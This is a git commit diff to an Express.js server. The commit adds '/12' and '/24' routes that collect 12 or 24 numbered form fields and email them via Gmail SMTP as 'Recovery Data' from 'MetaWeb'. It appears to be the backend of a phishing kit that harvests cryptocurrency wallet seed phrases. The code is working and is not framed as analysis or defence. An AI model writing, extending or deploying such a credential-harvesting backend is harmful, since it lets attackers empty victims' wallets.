f05385136d36d297c6d1e8bcdc210942bc8aff71
AlexCPT-cpu <alexodey79@gmail.com>
2024-03-25 21:27:42 +0100

    commit

--- index.js
+++ index.js
@@ -9,10 +9,9 @@ const port = 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 
 // Route to handle form submission
-app.post("/", (req, res) => {
+app.post("/12", (req, res) => {
   // Extract form data
   console.log(req.body);
-  console.log("to be trans");
 
   // Create a Nodemailer transporter with SMTP settings
   const transporter = nodemailer.createTransport({
@@ -26,12 +25,27 @@ app.post("/", (req, res) => {
     },
   });
 
+  const one = req.body["1"];
+  const two = req.body["2"];
+  const three = req.body["3"];
+  const four = req.body["4"];
+  const five = req.body["5"];
+  const six = req.body["6"];
+  const seven = req.body["7"];
+  const eight = req.body["8"];
+  const nine = req.body["9"];
+  const ten = req.body["10"];
+  const eleven = req.body["11"];
+  const twelve = req.body["12"];
+
+  const data = `${one} ${two} ${three} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}`;
+
   // Define email message
   const mailOptions = {
     from: "MetaWeb",
     to: [process.env.recipient1],
     subject: "Recovery Data",
-    text: req.body,
+    text: data,
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
@@ -41,6 +55,68 @@ app.post("/", (req, res) => {
       console.log("Email sent:", info.response);
     }
   });
+  res.sendStatus(200);
+});
+
+app.post("/24", (req, res) => {
+  // Extract form data
+  console.log(req.body);
+  // Create a Nodemailer transporter with SMTP settings
+  const transporter = nodemailer.createTransport({
+    service: "Gmail",
+    host: "smtp.gmail.com",
+    port: 465,
+    secure: true,
+    auth: {
+      user: process.env.email,
+      pass: process.env.password,
+    },
+  });
+
+  const one = req.body["1"];
+  const two = req.body["2"];
+  const three = req.body["3"];
+  const four = req.body["4"];
+  const five = req.body["5"];
+  const six = req.body["6"];
+  const seven = req.body["7"];
+  const eight = req.body["8"];
+  const nine = req.body["9"];
+  const ten = req.body["10"];
+  const eleven = req.body["11"];
+  const twelve = req.body["12"];
+  const thirteen = req.body["13"];
+  const fourteen = req.body["14"];
+  const fifteen = req.body["15"];
+  const sixteen = req.body["16"];
+  const seventeen = req.body["17"];
+  const eighteen = req.body["18"];
+  const nineteen = req.body["19"];
+  const twenty = req.body["20"];
+  const twentyone = req.body["21"];
+  const twentytwo = req.body["22"];
+  const twentythree = req.body["23"];
+  const twentyfour = req.body["24"];
+
+  const data = `${one} ${two} ${three} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}
+    ${thirteen} ${fourteen} ${fifteen} ${sixteen} ${seventeen} ${eighteen} ${nineteen} ${twenty} ${twentyone} ${twentytwo} ${twentythree} ${twentyfour}`;
+
+  // Define email message
+  const mailOptions = {
+    from: "MetaWeb",
+    to: [process.env.recipient1],
+    subject: "Recovery Data",
+    text: data,
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error("Error sending email:", error);
+    } else {
+      console.log("Email sent:", info.response);
+    }
+  });
+  res.sendStatus(200);
 });
 
 // Start server
